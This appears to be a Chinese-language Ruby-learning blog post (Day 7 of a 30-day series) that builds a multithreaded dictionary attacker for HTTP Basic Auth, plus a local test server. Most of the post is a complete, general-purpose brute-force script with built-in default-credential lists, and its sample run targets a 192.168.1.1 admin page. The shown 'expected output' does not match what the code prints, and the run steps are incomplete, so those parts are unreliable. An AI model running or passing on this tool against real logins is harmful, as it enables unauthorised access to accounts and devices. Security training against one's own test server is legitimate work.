---
title: "【30天學習新語言-Ruby】Day 7：寫一個簡易字典攻擊器測試弱密碼"
published: 2025-08-15T04:16:46.000Z
description: ""
tags: [Learning, Ruby, 30天學Ruby挑戰]
category: Learning
draft: false
---

## 💡 為什麼要字典攻擊？
其實，
即使到了 2025 年，
還是有一堆網站用 admin/admin、test/test 這種弱密碼。

字典攻擊（Dictionary Attack）就是用常見密碼清單，
一個一個去試，看能不能登入。
這是滲透測試中最基本但也最有效的技巧之一。

今天會實作一個針對 HTTP Basic Auth 的字典攻擊器，
順便學習怎麼從檔案讀取密碼清單。

## 🎯 大綱
- 建立測試環境
- 從檔案讀取使用者名稱和密碼清單
- 實作 HTTP Basic Authentication 
- 多執行緒加速測試
- 加入進度顯示和成功登入偵測

## 📚 知識點
- `File.readlines()` -- 讀取檔案每一行到陣列
- `Base64.encode64()` -- Basic Auth 需要 Base64 編碼
- `Net::HTTP.start()` -- 保持連線的 HTTP 請求
- `Thread.new` -- 多執行緒處理
- `Queue.new` -- 執行緒安全的佇列

## 💻 實作
`dictionary_attack.rb：`
```ruby
#!/usr/bin/env ruby
require 'net/http'
require 'base64'
require 'thread'

class DictionaryAttacker
  def initialize(target_url, threads = 10)
    @target_url = target_url
    @uri = URI.parse(target_url)
    @threads = threads
    @mutex = Mutex.new
    @queue = Queue.new
    @tested = 0
    @start_time = Time.now
    @found_credentials = []
  end
  
  def default_passwords
    %w[
      admin password 123456 password123 admin123
      test demo root toor letmein
      welcome 123456789 qwerty abc123
    ]
  end
  
  def default_usernames
    %w[
      admin administrator root test
      user demo guest oracle mysql
    ]
  end
  
  def test_credential(username, password)
    begin
      http = Net::HTTP.new(@uri.host, @uri.port)
      http.use_ssl = (@uri.scheme == 'https')
      http.open_timeout = 5
      http.read_timeout = 5
      
      request = Net::HTTP::Get.new('/')
      credentials = Base64.strict_encode64("#{username}:#{password}")
      request['Authorization'] = "Basic #{credentials}"
      
      response = http.request(request)
      
      # 200 = 成功, 403 = 認證成功但無權限（也算成功）
      return ['200', '403'].include?(response.code)
      
    rescue => e
      return false
    end
  end
  
  def attack
    usernames = default_usernames
    passwords = default_passwords
    
    puts "Starting dictionary attack on: #{@target_url}"
    puts "Usernames: #{usernames.size}, Passwords: #{passwords.size}"
    puts "Total combinations: #{usernames.size * passwords.size}"
    puts "-" * 50
    
    # 產生所有組合
    usernames.each do |username|
      passwords.each do |password|
        @queue << [username, password]
      end
    end
    
    total = @queue.size
    
    # 建立工作執行緒
    workers = []
    @threads.times do
      workers << Thread.new do
        loop do
          begin
            username, password = @queue.pop(true)
          rescue ThreadError
            break
          end
          
          @mutex.synchronize do
            @tested += 1
            print "\rProgress: #{@tested}/#{total} - Testing: #{username}:#{password}    "
          end
          
          if test_credential(username, password)
            @mutex.synchronize do
              @found_credentials << {username: username, password: password}
              puts "\nFOUND: #{username}:#{password}"
            end
          end
        end
      end
    end
    
    workers.each(&:join)
    
    puts "\n" + "=" * 50
    if @found_credentials.empty?
      puts "No valid credentials found."
    else
      puts "Found #{@found_credentials.size} valid credential(s):"
      @found_credentials.each do |cred|
        puts "    #{cred[:username]}:#{cred[:password]}"
      end
    end
    puts "Time: #{(Time.now - @start_time).round(2)}s"
  end
end

if ARGV.empty?
  puts "Usage: ruby #{$0} <target_url>"
  exit
end

attacker = DictionaryAttacker.new(ARGV[0])
attacker.attack
```

`test_server.rb：`
```
#!/usr/bin/env ruby
require 'webrick'
require 'base64'

# 設定有效的帳號密碼
VALID_USERS = {
  'admin' => 'password123',
  'test' => 'test'
}

server = WEBrick::HTTPServer.new(:Port => 8000)

server.mount_proc '/' do |req, res|
  auth_header = req['Authorization']
  
  if auth_header && auth_header.start_with?('Basic ')
    credentials = Base64.decode64(auth_header[6..-1])
    username, password = credentials.split(':', 2)
    
    if VALID_USERS[username] == password
      # 密碼正確 - 回傳 200
      res.status = 200
      res.body = "Welcome #{username}! Authentication successful.\n"
      puts "Auth SUCCESS: #{username}"
    else
      # 密碼錯誤 - 回傳 401
      res.status = 401
      res['WWW-Authenticate'] = 'Basic realm="Test"'
      res.body = "Invalid credentials\n"
      puts "Auth FAILED: #{username}:#{password}"
    end
  else
    # 沒有認證資訊 - 回傳 401
    res.status = 401
    res['WWW-Authenticate'] = 'Basic realm="Test"'
    res.body = "Authentication required\n"
  end
end

puts "Server started on http://localhost:8000"
puts "Valid credentials:"
VALID_USERS.each { |u,p| puts "    #{u}:#{p}" }
puts "Ctrl+C to stop"

trap('INT') { server.shutdown }
server.start
```

## 🚀 執行方式

1. 建立檔案 `dictionary_attack.rb`

2. 建立檔案 

3. 執行檔案 `dictionary_attack.rb`、`test_sesrver.rb`：
```
rb test_server.rb
rb dictionary_attack.rb （用另外一個 terminal）
```

4. 預期輸出：

```
Starting dictionary attack on: http://192.168.1.1/admin
Usernames: 20, Passwords: 30
Total combinations: 600
Threads: 10
--------------------------------------------------
Progress: 230/600 (38.33%) - Testing: root:monkey        

SUCCESS! Found valid credential:
    Username: admin
    Password: password123
    Time elapsed: 12.34 seconds
    Attempts: 247
```
![image](https://hackmd.io/_uploads/ryMyu_Vcgl.png)
![image](https://hackmd.io/_uploads/rk-ed_4qee.png)

